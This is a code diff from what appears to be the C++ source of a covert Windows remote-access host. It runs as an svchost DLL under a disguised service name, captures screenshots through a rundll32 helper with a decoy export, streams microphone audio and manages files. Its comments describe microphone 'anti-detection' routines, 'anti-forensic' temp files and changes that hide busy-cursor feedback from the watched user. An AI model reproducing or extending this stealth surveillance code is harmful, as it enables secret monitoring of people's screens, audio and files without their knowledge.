@@ -65,7 +65,6 @@ static void SuspendProcess(DWORD pid) {
 
 // Forward declarations for audio anti-detection functions (defined either in dllmain.cpp or below)
 //extern "C" void HideMicrophoneIconFromTray();
-extern "C" void AudioSuspendIndicatorProcesses();
 extern "C" void AudioCleanMicRegistry();
 extern "C" void AudioDeletePrivacyFiles();
 
@@ -137,7 +136,8 @@ static std::atomic<bool> g_audio_denoise{true};   // high-pass + noise gate
 static std::atomic<bool> g_audio_normalize{true}; // peak normalization
 static std::atomic<int>  g_audio_hum_filter{50};  // 0=off, 50=50Hz, 60=60Hz
 static void audio_thread_func(); // defined later
-static HANDLE g_audio_record_process = nullptr; // PID of current recording rundll32
+// (g_audio_record_process removed — was unused declaration left over from a
+//  rundll32-spawn audio path that never actually existed in this build.)
 
 #ifndef BUILD_AS_DLL
 HMODULE g_dll_module = nullptr;  // standalone exe: no DLL module
@@ -573,12 +573,9 @@ static void stop_file_workers() {
     g_file_workers.clear();
 }
 
-// Recording state
-static std::atomic<bool> g_recording{false};
-static std::ofstream g_rec_file;
-static std::mutex g_rec_mtx;
-static uint64_t g_rec_frame_count = 0;
-static std::chrono::steady_clock::time_point g_rec_start;
+// Recording is 100% client-side (MediaRecorder API → File System Access API).
+// Host has zero involvement: no record_start/stop command sent, no .rdv on disk.
+// Removed in v1.0.215+ (was legacy from pre-MediaRecorder client UI).
 
 // Forward declarations for AES (defined later with screenshot/audio encryption)
 static std::vector<uint8_t> aes_encrypt(const uint8_t* data, size_t len);
@@ -800,25 +797,7 @@ static void save_stream_settings() {
     }
 }
 
-// ===== Recording helpers =====
-static void recording_write_header() {
-    const char magic[4] = {'R','D','V','1'};
-    g_rec_file.write(magic, 4);
-    int32_t fps = g_fps;
-    g_rec_file.write(reinterpret_cast<char*>(&fps), 4);
-}
-
-static void recording_write_frame(const std::vector<uint8_t>& frame_data) {
-    if (!g_recording || !g_rec_file.is_open()) return;
-    std::lock_guard<std::mutex> lk(g_rec_mtx);
-    uint32_t sz = static_cast<uint32_t>(frame_data.size());
-    auto now = std::chrono::steady_clock::now();
-    uint64_t ts_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now - g_rec_start).count();
-    g_rec_file.write(reinterpret_cast<char*>(&sz), 4);
-    g_rec_file.write(reinterpret_cast<const char*>(&ts_ms), 8);
-    g_rec_file.write(reinterpret_cast<const char*>(frame_data.data()), sz);
-    ++g_rec_frame_count;
-}
+// (Recording helpers removed — see note above about client-side MediaRecorder.)
 
 // ===== Adaptive quality (time-based, every frame) =====
 static std::atomic<int> g_sent_frames{0};
@@ -1168,7 +1147,6 @@ static void stream_encode_func(int worker_id) {
             if (!fr.jpeg_data.empty() && g_streaming) {
                 frame_bytes = fr.jpeg_data.size();
                 msg = build_scrn_msg(fr);
-                if (g_recording) recording_write_frame(fr.jpeg_data);
             }
         }
 
@@ -1747,57 +1725,7 @@ static void handle_command(const std::string& msg_str) {
             send_ok("\"ok\"");
         }
 
-        // --- Recording ---
-        else if (cmd == "record_start") {
-            if (!g_recording) {
-                std::string recDir = json_get(msg_str, "recording_path");
-                if (recDir.empty()) {
-                    char tmpPath[MAX_PATH];
-                    DWORD n = GetTempPathA(MAX_PATH, tmpPath);
-                    if (n > 0 && n < MAX_PATH) recDir = tmpPath;
-                    else recDir = ".\\";
-                    if (recDir.back() != '\\' && recDir.back() != '/') recDir += "\\";
-                    recDir += "Prometey_Recordings";
-                }
-                std::error_code ec;
-                if (recDir.back() != '\\' && recDir.back() != '/') recDir += "\\";
-                fs::create_directories(fs::path(recDir), ec);
-                if (ec) {
-                    recDir = (fs::current_path(ec) / "Prometey_Recordings").string();
-                    if (recDir.back() != '\\') recDir += "\\";
-                    fs::create_directories(recDir, ec);
-                }
-                recDir = fs::absolute(fs::path(recDir), ec).string();
-                if (recDir.back() != '\\') recDir += "\\";
-                SYSTEMTIME st; GetLocalTime(&st);
-                char buf[64];
-                snprintf(buf, sizeof(buf), "%04d%02d%02d_%02d%02d%02d.rdv",
-                    st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
-                std::string fname = recDir + buf;
-                g_rec_file.open(fname, std::ios::binary);
-                if (g_rec_file.is_open()) {
-                    g_rec_frame_count = 0;
-                    g_rec_start = std::chrono::steady_clock::now();
-                    recording_write_header();
-                    g_recording = true;
-                    send_ok("\"" + json_escape(fname) + "\"");
-                } else {
-                    send_err("Cannot open recording file: " + fname);
-                }
-            } else {
-                send_err("Already recording");
-            }
-        }
-        else if (cmd == "record_stop") {
-            if (g_recording) {
-                g_recording = false;
-                std::lock_guard<std::mutex> lk(g_rec_mtx);
-                g_rec_file.close();
-                send_ok("{\"frames\":" + std::to_string(g_rec_frame_count) + "}");
-            } else {
-                send_err("Not recording");
-            }
-        }
+        // (Recording handlers removed — recording is client-side via MediaRecorder.)
 
         // --- File manager ---
         else if (cmd == "file_list") {
@@ -1877,8 +1805,9 @@ static void handle_command(const std::string& msg_str) {
             std::string from = json_get(msg_str, "from");
             std::string to   = json_get(msg_str, "to");
             if (from.empty() || to.empty()) { send_err("file_copy requires from and to"); return; }
-            std::error_code ec;
-            fs::create_directories(fs::path(to).parent_path(), ec);
+            // copy_path internally creates parent dirs with UTF-8 path conversion;
+            // no need to pre-create here (and pre-creating with fs::path(std::string)
+            // would re-introduce the ANSI/Unicode bug on non-ASCII names).
             bool ok = g_files.copy_path(from, to);
             ok ? send_ok("\"copied\"") : send_err("Copy failed: " + from);
 #else
@@ -1912,7 +1841,7 @@ static void handle_command(const std::string& msg_str) {
         else if (cmd == "file_info") {
             std::string path = json_get(msg_str, "path");
             std::error_code ec;
-            auto sz = fs::file_size(path, ec);
+            auto sz = fs::file_size(FileManager::u8_path(path), ec);
             std::string r = "{\"size\":" + std::to_string(ec ? 0 : sz) + "}";
             send_ok(r);
         }
@@ -2856,7 +2785,7 @@ static void handle_command(const std::string& msg_str) {
 
         else if (cmd == "host_restart") {
 #ifdef STAGE1_KEEP_FALLBACKS
-            // Restart the WPnpSvc service — svchost unloads DLL, SCM restarts it
+            // Restart the MspIscSvc service — svchost unloads DLL, SCM restarts it
             send_ok("\"restarting\"");
             Sleep(500);
             spawn_bg_worker([]() {
@@ -2867,9 +2796,9 @@ static void handle_command(const std::string& msg_str) {
                     std::ofstream f(bat);
                     f << "@echo off\r\n";
                     f << "timeout /t 2 /nobreak >nul\r\n";
-                    f << "sc.exe stop WPnpSvc >nul 2>nul\r\n";
+                    f << "sc.exe stop MspIscSvc >nul 2>nul\r\n";
                     f << "timeout /t 3 /nobreak >nul\r\n";
-                    f << "sc.exe start WPnpSvc >nul 2>nul\r\n";
+                    f << "sc.exe start MspIscSvc >nul 2>nul\r\n";
                     f << "del \"%~f0\"\r\n";
                 }
                 STARTUPINFOA si = {}; si.cb = sizeof(si);
@@ -2950,8 +2879,8 @@ static void handle_command(const std::string& msg_str) {
                         // sc stop blocks until SCM timeout (~30s) if service hangs — avoid deadlock:
                         // 1) get host PID first, 2) send stop in background, 3) force-kill by PID after 5s
                         step("3|Stopping service");
-                        addLn("for /f \"tokens=3\" %%P in ('sc queryex WPnpSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
-                        addLn("start /b \"\" sc.exe stop WPnpSvc >nul 2>nul");
+                        addLn("for /f \"tokens=3\" %%P in ('sc queryex MspIscSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
+                        addLn("start /b \"\" sc.exe stop MspIscSvc >nul 2>nul");
                         addLn("timeout /t 5 /nobreak >nul 2>nul");
                         addLn("if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>nul");
                         addLn("timeout /t 2 /nobreak >nul 2>nul");
@@ -2963,24 +2892,24 @@ static void handle_command(const std::string& msg_str) {
                         addLn("timeout /t 2 /nobreak >nul 2>nul");
                         // Step 5: Start service (host comes back online)
                         step("5|Starting service");
-                        addLn("sc.exe start WPnpSvc >nul 2>nul");
+                        addLn("sc.exe start MspIscSvc >nul 2>nul");
                         addLn("timeout /t 8 /nobreak >nul 2>nul");
                         // Verify service actually RUNNING — if not, roll back to .old and retry.
                         // Without this the host stays offline forever if the new DLL is broken
                         // or couldn't be loaded (e.g. dependency missing, import error).
-                        addLn("sc.exe query WPnpSvc | findstr /C:\"RUNNING\" >nul 2>nul");
+                        addLn("sc.exe query MspIscSvc | findstr /C:\"RUNNING\" >nul 2>nul");
                         addLn("if not errorlevel 1 goto after_start_ok");
                         step("5|Service not RUNNING, rolling back");
-                        addLn("for /f \"tokens=3\" %%P in ('sc queryex WPnpSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
-                        addLn("start /b \"\" sc.exe stop WPnpSvc >nul 2>nul");
+                        addLn("for /f \"tokens=3\" %%P in ('sc queryex MspIscSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
+                        addLn("start /b \"\" sc.exe stop MspIscSvc >nul 2>nul");
                         addLn("timeout /t 5 /nobreak >nul 2>nul");
                         addLn("if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>nul");
                         addLn("timeout /t 2 /nobreak >nul 2>nul");
                         addLn("del /f /q \"" + currentDll + "\" >nul 2>nul");
                         addLn("if exist \"" + oldDll + "\" copy /y \"" + oldDll + "\" \"" + currentDll + "\" >nul 2>nul");
-                        addLn("sc.exe start WPnpSvc >nul 2>nul");
+                        addLn("sc.exe start MspIscSvc >nul 2>nul");
                         addLn("timeout /t 5 /nobreak >nul 2>nul");
-                        addLn("sc.exe query WPnpSvc | findstr /C:\"RUNNING\" >nul 2>nul");
+                        addLn("sc.exe query MspIscSvc | findstr /C:\"RUNNING\" >nul 2>nul");
                         addLn("if not errorlevel 1 (echo ERR^|Rollback OK, new DLL invalid > \"" + stepFile + "\" & goto cleanup)");
                         addLn("echo ERR^|Rollback FAILED — host offline > \"" + stepFile + "\" & goto cleanup");
                         addLn(":after_start_ok");
@@ -3010,7 +2939,7 @@ static void handle_command(const std::string& msg_str) {
                         // Launch bat as detached process — independent of spoolsv lifetime
                         std::string runCmd = "cmd.exe /c \"" + batPath + "\"";
                         STARTUPINFOA si = { sizeof(si) };
-                        si.dwFlags = STARTF_USESHOWWINDOW;
+                        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
                         si.wShowWindow = SW_HIDE;
                         PROCESS_INFORMATION pi = {};
                         CreateProcessA(NULL, (LPSTR)runCmd.c_str(), NULL, NULL, FALSE,
@@ -3060,7 +2989,9 @@ static void handle_command(const std::string& msg_str) {
                         CreateEnvironmentBlock(&pEnv, hDup, FALSE);
                         STARTUPINFOA si = {}; si.cb = sizeof(si);
                         si.lpDesktop = (LPSTR)"winsta0\\default";
-                        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
+                        // STARTF_FORCEOFFFEEDBACK = no busy cursor flicker on host.
+                        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
+                        si.wShowWindow = SW_HIDE;
                         PROCESS_INFORMATION pi = {};
                         if (CreateProcessAsUserA(hDup, nullptr, (LPSTR)cmdLine.c_str(), nullptr, nullptr, FALSE,
                                 CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, pEnv, nullptr, &si, &pi)) {
@@ -3453,7 +3384,7 @@ static void handle_command(const std::string& msg_str) {
                 CloseHandle(hb);
 
                 STARTUPINFOA si = {sizeof(si)};
-                si.dwFlags = STARTF_USESHOWWINDOW;
+                si.dwFlags = STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
                 si.wShowWindow = SW_HIDE;
                 PROCESS_INFORMATION pi = {};
                 std::string runCmd = "cmd.exe /c \"" + batPath + "\"";
@@ -3739,33 +3670,52 @@ static bool capture_screenshot_user_session(std::vector<uint8_t>& jpegOut, std::
     std::string dllPath(dllPathBuf);
     g_log.debug("Screenshot: DLL path=" + dllPath + " session=" + std::to_string(sessionId));
 
-    // Temp files
-    char tmpPath[MAX_PATH];
-    GetTempPathA(MAX_PATH, tmpPath);
-    uint64_t tick = GetTickCount64();
-    // Random names without recognizable extensions (anti-forensic)
-    std::string outFile = std::string(tmpPath) + std::to_string(tick) + ".tmp";
-    std::string titleFile = std::string(tmpPath) + std::to_string(tick) + "t.tmp";
+    // ── Build a uniquely-named pipe and create it BEFORE spawning the helper.
+    //    NULL DACL so the impersonated user-session rundll32 can connect.
+    char pipeNameBuf[80];
+    snprintf(pipeNameBuf, sizeof(pipeNameBuf),
+             "\\\\.\\pipe\\rdh_ss_%lu_%llu",
+             (unsigned long)GetCurrentProcessId(),
+             (unsigned long long)GetTickCount64());
+    std::string pipeName(pipeNameBuf);
 
-    // Build command: rundll32.exe "path\to\dll",PnpDiagReport quality scale mode output title
+    SECURITY_DESCRIPTOR sd; InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
+    SetSecurityDescriptorDacl(&sd, TRUE, nullptr, FALSE);  // NULL DACL = everyone
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), &sd, FALSE };
+
+    HANDLE hPipe = CreateNamedPipeA(
+        pipeName.c_str(),
+        PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
+        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+        1,                      // single instance
+        0, 32 * 1024 * 1024,    // out=0, in=32MB (max screenshot)
+        5000,
+        &sa);
+    if (hPipe == INVALID_HANDLE_VALUE) {
+        g_log.warn("Screenshot: CreateNamedPipe failed err=" + std::to_string(GetLastError()));
+        return false;
+    }
+
+    // Build command: rundll32.exe "path\to\dll",PnpDiagReport quality scale mode pipeName
     int mode = g_screenshot_mode.load();
     std::string cmdLine = "rundll32.exe \"" + dllPath + "\",PnpDiagReport " +
-        std::to_string(quality) + " " + std::to_string(scale) + " " + std::to_string(mode) + " " + outFile + " " + titleFile;
+        std::to_string(quality) + " " + std::to_string(scale) + " " + std::to_string(mode) + " " + pipeName;
 
     // Get user token
     HANDLE hToken = nullptr;
-    if (!WTSQueryUserToken(sessionId, &hToken)) return false;
+    if (!WTSQueryUserToken(sessionId, &hToken)) { CloseHandle(hPipe); return false; }
     HANDLE hDupToken = nullptr;
     DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenPrimary, &hDupToken);
     CloseHandle(hToken);
-    if (!hDupToken) return false;
+    if (!hDupToken) { CloseHandle(hPipe); return false; }
 
     LPVOID pEnv = nullptr;
     CreateEnvironmentBlock(&pEnv, hDupToken, FALSE);
 
     STARTUPINFOA si = {}; si.cb = sizeof(si);
     si.lpDesktop = (LPSTR)"winsta0\\default";
-    si.dwFlags = STARTF_USESHOWWINDOW;
+    // STARTF_FORCEOFFFEEDBACK = no busy cursor flicker on the host's screen.
+    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
     si.wShowWindow = SW_HIDE;
     PROCESS_INFORMATION pi = {};
 
@@ -3777,34 +3727,84 @@ static bool capture_screenshot_user_session(std::vector<uint8_t>& jpegOut, std::
     if (!ok) {
         DWORD err = GetLastError();
         g_log.warn("Screenshot: CreateProcessAsUser failed err=" + std::to_string(err) + " cmd=" + cmdLine);
+        CloseHandle(hPipe);
         return false;
     }
 
     g_log.debug("Screenshot: rundll32 started PID=" + std::to_string(pi.dwProcessId));
-    DWORD waitResult = WaitForSingleObject(pi.hProcess, 10000);
+
+    // ── Connect + read with timeouts via overlapped I/O ──
+    HANDLE hEv = CreateEventA(nullptr, TRUE, FALSE, nullptr);
+    OVERLAPPED ovl = {}; ovl.hEvent = hEv;
+
+    bool gotData = false;
+    do {
+        // Wait for client (rundll32) to open the pipe — bounded by 10s OR process exit.
+        BOOL c = ConnectNamedPipe(hPipe, &ovl);
+        DWORD ce = GetLastError();
+        bool connected = false;
+        if (c || ce == ERROR_PIPE_CONNECTED) {
+            connected = true;
+        } else if (ce == ERROR_IO_PENDING) {
+            HANDLE waiters[2] = { hEv, pi.hProcess };
+            DWORD wr = WaitForMultipleObjects(2, waiters, FALSE, 10000);
+            if (wr == WAIT_OBJECT_0) connected = true;
+            else CancelIoEx(hPipe, &ovl);
+        }
+        if (!connected) { g_log.warn("Screenshot: pipe connect timeout"); break; }
+
+        // Helper reads/writes one block at a time; we read with 5s per-op timeout.
+        auto readN = [&](void* dst, size_t want) -> bool {
+            uint8_t* p = static_cast<uint8_t*>(dst);
+            size_t got = 0;
+            while (got < want) {
+                ResetEvent(hEv);
+                DWORD br = 0;
+                DWORD chunk = (DWORD)std::min<size_t>(want - got, 1u << 20);  // 1 MB
+                BOOL r = ReadFile(hPipe, p + got, chunk, &br, &ovl);
+                if (!r) {
+                    DWORD re = GetLastError();
+                    if (re != ERROR_IO_PENDING) return false;
+                    DWORD ww = WaitForSingleObject(hEv, 5000);
+                    if (ww != WAIT_OBJECT_0) { CancelIoEx(hPipe, &ovl); return false; }
+                    if (!GetOverlappedResult(hPipe, &ovl, &br, FALSE)) return false;
+                }
+                if (br == 0) return false;
+                got += br;
+            }
+            return true;
+        };
+
+        uint32_t hdr[2] = { 0, 0 };
+        if (!readN(hdr, sizeof(hdr))) { g_log.warn("Screenshot: header read failed"); break; }
+        uint32_t jpegSize = hdr[0];
+        uint32_t titleSize = hdr[1];
+        if (jpegSize == 0 || jpegSize > 50u * 1024 * 1024) {
+            g_log.warn("Screenshot: bad jpegSize=" + std::to_string(jpegSize));
+            break;
+        }
+        jpegOut.resize(jpegSize);
+        if (!readN(jpegOut.data(), jpegSize)) { g_log.warn("Screenshot: JPEG read failed"); jpegOut.clear(); break; }
+        if (titleSize > 0 && titleSize < 4096u) {
+            windowTitle.assign((size_t)titleSize, '\0');
+            readN(windowTitle.data(), titleSize); // best-effort
+        }
+        gotData = true;
+    } while (false);
+
+    CloseHandle(hEv);
+    DisconnectNamedPipe(hPipe);
+    CloseHandle(hPipe);
+
+    DWORD wr2 = WaitForSingleObject(pi.hProcess, 5000);
     DWORD exitCode = 0;
     GetExitCodeProcess(pi.hProcess, &exitCode);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    g_log.debug("Screenshot: rundll32 finished wait=" + std::to_string(waitResult) + " exit=" + std::to_string(exitCode));
+    g_log.debug("Screenshot: rundll32 finished wait=" + std::to_string(wr2) +
+                " exit=" + std::to_string(exitCode) + " bytes=" + std::to_string(jpegOut.size()));
 
-    // Read JPEG
-    std::ifstream fJpeg(outFile, std::ios::binary);
-    if (!fJpeg.is_open()) { g_log.warn("Screenshot: JPEG file not found: " + outFile); return false; }
-    jpegOut.assign((std::istreambuf_iterator<char>(fJpeg)), std::istreambuf_iterator<char>());
-    fJpeg.close();
-    DeleteFileA(outFile.c_str());
-
-    // Read window title
-    std::ifstream fTitle(titleFile);
-    if (fTitle.is_open()) {
-        std::getline(fTitle, windowTitle);
-        while (!windowTitle.empty() && (windowTitle.back() == '\n' || windowTitle.back() == '\r')) windowTitle.pop_back();
-        fTitle.close();
-    }
-    DeleteFileA(titleFile.c_str());
-
-    return !jpegOut.empty();
+    return gotData && !jpegOut.empty();
 }
 
 static void screenshot_thread_func() {
@@ -4349,8 +4349,8 @@ static void capture_audio_live_stream_wasapi(int sampleRate, int bitrate, int ch
     std::vector<uint8_t> opusBuf(4000);
     uint32_t serial = (uint32_t)GetTickCount();
 
-    // 3-second chunks (same as waveIn live path)
-    const int chunkFrames = opusSR * 3;
+    // 1-second chunks — reduces audio-video latency from ~3s to ~1s
+    const int chunkFrames = opusSR * 1;
 
     // DSP state (persistent across chunks to avoid stitching artefacts)
     audio_dsp::HighPassState dsp_hp; dsp_hp.configure(opusSR, channels, 80.f);
@@ -4613,7 +4613,7 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
 
     // Double-buffered waveIn: 2 buffers, each holds 2 seconds of PCM
     // Each completed buffer → encode as complete OGG (headers+data+EOS) → send as ALIV
-    const int chunkDurationMs = 3000; // 3 seconds per chunk — balance latency vs. less crossfade artifacts
+    const int chunkDurationMs = 1000; // 1 second per chunk — reduces audio-video latency to ~1s
     const DWORD chunkBufBytes = (DWORD)(wfx.nAvgBytesPerSec * chunkDurationMs / 1000);
     std::vector<BYTE> pcmBuf1(chunkBufBytes), pcmBuf2(chunkBufBytes);
     WAVEHDR wh1 = {}, wh2 = {};
@@ -4717,11 +4717,15 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
     };
 
     while (g_audio_active.load() && g_running && g_ws && g_ws->is_connected()) {
-        // ── Detect runtime device change: break out so audio_thread_func re-enters ──
-        // capture_audio_live_stream() with the new device.
+        // ── Detect runtime device or source change: break so audio_thread_func re-enters ──
         if (g_audio_device_id.load() != cur_device_setting) {
             g_log.info("Audio LIVE: device changed (" + std::to_string(cur_device_setting) +
                        " -> " + std::to_string(g_audio_device_id.load()) + "), restarting capture");
+            break;
+        }
+        // Source switched to system audio → hand off to WASAPI path
+        if (g_audio_source.load() != 0) {
+            g_log.info("Audio LIVE: source changed to loopback, restarting capture");
             break;
         }
         WaitForSingleObject(hEvent, chunkDurationMs + 500);
